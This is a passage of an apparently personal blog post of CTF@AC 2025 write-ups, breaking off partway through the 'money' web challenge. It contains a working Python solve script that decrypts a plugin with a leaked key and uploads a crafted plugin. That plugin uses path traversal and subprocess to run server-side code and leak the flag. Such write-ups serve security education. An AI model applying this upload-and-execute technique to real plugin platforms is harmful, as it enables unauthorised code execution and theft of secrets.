<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>CTF@AC 2025 | Website</title>
<meta name="keywords" content="ctfatac, ctf, binary, crypto, web, ctfatac2025">
<meta name="description" content="Some writeups of the CTF@AC ctf 2025 edition.">
<meta name="author" content="Paolo">
<link rel="canonical" href="https://pascalctf.github.io/en/ctf/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.08f7d74f0ada0f975d29ae436285b61ed7a719d05f350cb888d00341642995a2.css" integrity="sha256-CPfXTwraD5ddKa5DYoW2HtenGdBfNQy4iNADQWQplaI=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://pascalctf.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://pascalctf.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://pascalctf.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://pascalctf.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://pascalctf.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://pascalctf.github.io/en/ctf/ctfatac/">
<link rel="alternate" hreflang="it" href="https://pascalctf.github.io/it/ctf/ctfatac/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
<meta property="og:url" content="https://pascalctf.github.io/en/ctf/ctfatac/">
  <meta property="og:site_name" content="Website">
  <meta property="og:title" content="CTF@AC 2025">
  <meta property="og:description" content="Some writeups of the CTF@AC ctf 2025 edition.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="ctf">
    <meta property="article:published_time" content="2025-09-16T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-09-16T00:00:00+00:00">
    <meta property="article:tag" content="Ctfatac">
    <meta property="article:tag" content="Ctf">
    <meta property="article:tag" content="Binary">
    <meta property="article:tag" content="Crypto">
    <meta property="article:tag" content="Web">
    <meta property="article:tag" content="Ctfatac2025">
    <meta property="og:image" content="https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/PascalCTF/PascalCTF.github.io">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/PascalCTF/PascalCTF.github.io">
<meta name="twitter:title" content="CTF@AC 2025">
<meta name="twitter:description" content="Some writeups of the CTF@AC ctf 2025 edition.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Capture The Flag üö©",
      "item": "https://pascalctf.github.io/en/ctf/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "CTF@AC 2025",
      "item": "https://pascalctf.github.io/en/ctf/ctfatac/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CTF@AC 2025",
  "name": "CTF@AC 2025",
  "description": "Some writeups of the CTF@AC ctf 2025 edition.",
  "keywords": [
    "ctfatac", "ctf", "binary", "crypto", "web", "ctfatac2025"
  ],
  "articleBody": "CTF@AC 2025 Web üåê money Analysis The challenge exposes a minimal dashboard that supports third‚Äëparty plugins. When we upload a plugin, the platform also lets us download any existing ones (including the official flag.plugin).\nExploit After downloading flag.plugin, we notice it‚Äôs encrypted. The server.py file contains both the key and the function to decrypt it, so we can locally decrypt it using decrypt_file.\nKEY = b\"SECRET_KEY!123456XXXXXXXXXXXXXXX\" def decrypt_file(input_path, output_path, key): with open(input_path, \"rb\") as f: data = f.read() iv = data[:16] ciphertext = data[16:] cipher = AES.new(key, AES.MODE_CBC, iv) plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size) with open(output_path, \"wb\") as f: f.write(plaintext) The decrypted flag.plugin init.py contains the following code:\nimport json, sqlite3, pathlib, time, uuid import os plugin_dir = pathlib.Path(__file__).resolve().parent manifest_path = plugin_dir / \"plugin_manifest.json\" name, version = \"Widget\", \"1.0.0\" if manifest_path.exists(): try: m = json.loads(manifest_path.read_text()) name = m.get(\"name\", name) version = m.get(\"version\", version) except Exception: pass thumb = thumb = f''' ",
  "wordCount" : "6997",
  "inLanguage": "en",
  "image":"https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/PascalCTF/PascalCTF.github.io","datePublished": "2025-09-16T00:00:00Z",
  "dateModified": "2025-09-16T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Paolo"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://pascalctf.github.io/en/ctf/ctfatac/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Website",
    "logo": {
      "@type": "ImageObject",
      "url": "https://pascalctf.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://pascalctf.github.io/en/" accesskey="h" title="Home (Alt + H)">
                <img src="https://pascalctf.github.io/apple-touch-icon.png" alt="" aria-label="logo"
                    height="35">Home</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
                <ul class="lang-switch"><li>|</li>
                    <li>
                        <a href="https://pascalctf.github.io/it/" title="Italian"
                            aria-label=":it: It">üáÆüáπ It</a>
                    </li>
                </ul>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://pascalctf.github.io/en/projects/" title="üìí Projects">
                    <span>üìí Projects</span>
                </a>
            </li>
            <li>
                <a href="https://pascalctf.github.io/en/ctf/" title="‚öô Writeups">
                    <span>‚öô Writeups</span>
                </a>
            </li>
            <li>
                <a href="https://pascalctf.github.io/en/competitions/" title="üèÜ Competitions">
                    <span>üèÜ Competitions</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://pascalctf.github.io/en/">Home</a>&nbsp;¬ª&nbsp;<a href="https://pascalctf.github.io/en/ctf/">Capture The Flag üö©</a></div>
    <h1 class="post-title entry-hint-parent">
      CTF@AC 2025
    </h1>
    <div class="post-description">
      Some writeups of the CTF@AC ctf 2025 edition.
    </div>
    <div class="post-meta"><span title='2025-09-16 00:00:00 +0000 UTC'>September 16, 2025</span>&nbsp;¬∑&nbsp;33 min&nbsp;¬∑&nbsp;6997 words&nbsp;¬∑&nbsp;Paolo&nbsp;|&nbsp;Translations:
<ul class="i18n_list">
    <li>
        <a href="https://pascalctf.github.io/it/ctf/ctfatac/">üáÆüáπ It</a>
    </li>
</ul>&nbsp;|&nbsp;<a href="https://github.com/PascalCTF/PascalCTF.github.io/blob/main/content/en/ctf/ctfatac.md" rel="noopener noreferrer edit" target="_blank">Suggest Changes</a>

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#web-">Web üåê</a>
      <ul>
        <li><a href="#money">money</a></li>
        <li><a href="#random-gallery">Random Gallery</a></li>
        <li><a href="#theme-generator">Theme-Generator</a></li>
      </ul>
    </li>
    <li><a href="#binary-exploitation-">Binary exploitation üè¥‚Äç‚ò†Ô∏è</a>
      <ul>
        <li><a href="#sigdance">Sigdance</a></li>
        <li><a href="#baby-bof">baby-bof</a></li>
        <li><a href="#fini">fini</a></li>
        <li><a href="#minecrafty">Minecrafty</a></li>
      </ul>
    </li>
    <li><a href="#reverse-engineering-">Reverse engineering ‚öôÔ∏è</a>
      <ul>
        <li><a href="#pythonese">Pythonese</a></li>
        <li><a href="#pixel-gate">Pixel Gate</a></li>
        <li><a href="#ironevil">Ironevil</a></li>
      </ul>
    </li>
    <li><a href="#cryptography-">Cryptography üîë</a>
      <ul>
        <li><a href="#repeated-rsa">Repeated RSA</a></li>
        <li><a href="#sss">SSS</a></li>
        <li><a href="#xorbitant">XORbitant</a></li>
      </ul>
    </li>
    <li><a href="#miscellaneous-">Miscellaneous üêß</a>
      <ul>
        <li><a href="#octojail">Octojail</a></li>
        <li><a href="#onions1">onions1</a></li>
        <li><a href="#escaping-barcellona">Escaping Barcellona</a></li>
        <li><a href="#onions2">Onions2</a></li>
        <li><a href="#disco-dance">Disco Dance</a></li>
        <li><a href="#disco-rave">Disco Rave</a></li>
      </ul>
    </li>
    <li><a href="#forensics-">Forensics ü§ñ</a>
      <ul>
        <li><a href="#unknown-traffic-1">Unknown Traffic 1</a></li>
        <li><a href="#unknown-traffic-2">Unknown Traffic 2</a></li>
        <li><a href="#hidden-in-the-cartridge">Hidden in the Cartridge</a></li>
        <li><a href="#baofeng">Baofeng</a></li>
        <li><a href="#3rd-child">3rd child</a></li>
      </ul>
    </li>
    <li><a href="#osint-">OSINT üåè</a>
      <ul>
        <li><a href="#holiday-trip">Holiday Trip</a></li>
        <li><a href="#prison">Prison</a></li>
      </ul>
    </li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="ctfac-2025">CTF@AC 2025<a hidden class="anchor" aria-hidden="true" href="#ctfac-2025">#</a></h1>
<p><img alt="ctf at ac logo" loading="lazy" src="/images/ctf@ac.png"></p>
<h2 id="web-">Web üåê<a hidden class="anchor" aria-hidden="true" href="#web-">#</a></h2>
<h3 id="money">money<a hidden class="anchor" aria-hidden="true" href="#money">#</a></h3>
<h4 id="analysis">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis">#</a></h4>
<p>The challenge exposes a minimal dashboard that supports third‚Äëparty plugins. When we upload a plugin, the platform also lets us download any existing ones (including the official <code>flag.plugin</code>).</p>
<h4 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h4>
<p>After downloading <code>flag.plugin</code>, we notice it‚Äôs encrypted. <code>The server.py</code> file contains both the key and the function to decrypt it, so we can locally decrypt it using <code>decrypt_file</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">KEY</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;SECRET_KEY!123456XXXXXXXXXXXXXXX&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt_file</span><span class="p">(</span><span class="n">input_path</span><span class="p">,</span> <span class="n">output_path</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">input_path</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">iv</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="mi">16</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">16</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">),</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_path</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span>
</span></span></code></pre></div><p>The decrypted <code>flag.plugin</code> <code>init.py</code> contains the following code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span><span class="o">,</span> <span class="nn">sqlite3</span><span class="o">,</span> <span class="nn">pathlib</span><span class="o">,</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">uuid</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="n">plugin_dir</span> <span class="o">=</span> <span class="n">pathlib</span><span class="o">.</span><span class="n">Path</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)</span><span class="o">.</span><span class="n">resolve</span><span class="p">()</span><span class="o">.</span><span class="n">parent</span>
</span></span><span class="line"><span class="cl"><span class="n">manifest_path</span> <span class="o">=</span> <span class="n">plugin_dir</span> <span class="o">/</span> <span class="s2">&#34;plugin_manifest.json&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">name</span><span class="p">,</span> <span class="n">version</span> <span class="o">=</span> <span class="s2">&#34;Widget&#34;</span><span class="p">,</span> <span class="s2">&#34;1.0.0&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">manifest_path</span><span class="o">.</span><span class="n">exists</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">m</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">manifest_path</span><span class="o">.</span><span class="n">read_text</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="n">name</span> <span class="o">=</span> <span class="n">m</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">version</span> <span class="o">=</span> <span class="n">m</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;version&#34;</span><span class="p">,</span> <span class="n">version</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">thumb</span> <span class="o">=</span> <span class="n">thumb</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;&#39;&#39;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;320&#34; height=&#34;180&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;rect x=&#34;0&#34; y=&#34;0&#34; width=&#34;320&#34; height=&#34;180&#34; fill=&#34;#eef&#34;/&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;text x=&#34;50%&#34; y=&#34;50&#34; dominant-baseline=&#34;middle&#34; text-anchor=&#34;middle&#34;
</span></span></span><span class="line"><span class="cl"><span class="s1">      font-size=&#34;48&#34; font-family=&#34;sans-serif&#34;&gt;üö©&lt;/text&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;text x=&#34;50%&#34; y=&#34;110&#34; dominant-baseline=&#34;middle&#34; text-anchor=&#34;middle&#34;
</span></span></span><span class="line"><span class="cl"><span class="s1">      font-size=&#34;16&#34; font-family=&#34;sans-serif&#34; fill=&#34;#444&#34;&gt;v</span><span class="si">{</span><span class="n">version</span><span class="si">}</span><span class="s1">&lt;/text&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;/svg&gt;&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">plugin_dir</span> <span class="o">/</span> <span class="s2">&#34;thumbnail.svg&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">write_text</span><span class="p">(</span><span class="n">thumb</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;FLAG&#34;</span><span class="p">,</span><span class="s2">&#34;You ran this locally and did not set a dummy flag, dummy.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;You cannot see this MUHAHAHAHA:&#34;</span> <span class="o">+</span> <span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></div><p>In short, <code>init.py</code> prints the flag to stdout when executed. The server executes a plugin‚Äôs <code>init.py</code> during upload (<code>/upload</code>). Our idea is to leverage this behavior from another plugin:</p>
<ul>
<li>First, we need to discover the server‚Äëside UID of the <code>flag</code> widget so we know its directory name.</li>
<li>Then, we have to craft a malicious plugin whose <code>init.py</code> uses a relative path traversal (<code>../{uid}/init.py</code>) to execute the flag plugin‚Äôs <code>init.py</code> via <code>subprocess</code> and capture stdout.</li>
<li>Finally, write that stdout into <code>index.html</code>, which the platform renders back to us.</li>
</ul>
<p>For the exploit to work reliably, use the folder structure below.</p>
<h4 id="exploit-folder-structure">Exploit folder structure<a hidden class="anchor" aria-hidden="true" href="#exploit-folder-structure">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">.
</span></span><span class="line"><span class="cl">‚îú‚îÄ‚îÄ plug
</span></span><span class="line"><span class="cl">‚îÇ   ‚îú‚îÄ‚îÄ icon.png (empty)
</span></span><span class="line"><span class="cl">‚îÇ   ‚îú‚îÄ‚îÄ init.py
</span></span><span class="line"><span class="cl">‚îÇ   ‚îî‚îÄ‚îÄ plugin_manifest.json
</span></span><span class="line"><span class="cl">‚îî‚îÄ‚îÄ solve.py
</span></span></code></pre></div><h5 id="python-solution">Python solution<a hidden class="anchor" aria-hidden="true" href="#python-solution">#</a></h5>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">pad</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">bs4</span><span class="o">,</span> <span class="nn">subprocess</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">PORT</span> <span class="o">=</span> <span class="mi">9035</span>
</span></span><span class="line"><span class="cl"><span class="n">URL</span> <span class="o">=</span> <span class="s1">&#39;http://ctf.ac.upt.ro:&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">PORT</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;/&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">soup</span> <span class="o">=</span> <span class="n">bs4</span><span class="o">.</span><span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s2">&#34;html.parser&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">img</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;img&#34;</span><span class="p">,</span> <span class="n">alt</span><span class="o">=</span><span class="s2">&#34;Flag&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">img</span><span class="p">[</span><span class="s2">&#34;src&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Flag uid:&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">exploit</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">import subprocess
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">result = subprocess.run([&#39;python&#39;, &#39;../</span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s2">/init.py&#39;], capture_output=True, text=True)
</span></span></span><span class="line"><span class="cl"><span class="s2">with open(&#39;index.html&#39;, &#39;w&#39;) as f:
</span></span></span><span class="line"><span class="cl"><span class="s2">    f.write(result.stdout)
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;plug/init.py&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s1">&#39;zip&#39;</span><span class="p">,</span> <span class="s1">&#39;-r&#39;</span><span class="p">,</span> <span class="s1">&#39;../plug.zip&#39;</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">],</span> <span class="n">check</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">cwd</span><span class="o">=</span><span class="s1">&#39;plug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">KEY</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;SECRET_KEY!123456XXXXXXXXXXXXXXX&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;plug.zip&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">iv</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">KEY</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ciphertext</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;myplugin.plugin&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">iv</span> <span class="o">+</span> <span class="n">ciphertext</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s1">&#39;upload&#39;</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;file&#34;</span><span class="p">:</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;myplugin.plugin&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">soup</span> <span class="o">=</span> <span class="n">bs4</span><span class="o">.</span><span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s2">&#34;html.parser&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">img</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;img&#34;</span><span class="p">,</span> <span class="n">alt</span><span class="o">=</span><span class="s2">&#34;My exploit&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">widget</span> <span class="o">=</span> <span class="n">img</span><span class="p">[</span><span class="s2">&#34;src&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Widget uid:&#34;</span><span class="p">,</span> <span class="n">widget</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s1">&#39;widget/&#39;</span> <span class="o">+</span> <span class="n">widget</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="plugin">Plugin<a hidden class="anchor" aria-hidden="true" href="#plugin">#</a></h4>
<p><strong><code>init.py</code></strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s1">&#39;python&#39;</span><span class="p">,</span> <span class="s1">&#39;../flag-uid-goes-here/init.py&#39;</span><span class="p">],</span> <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
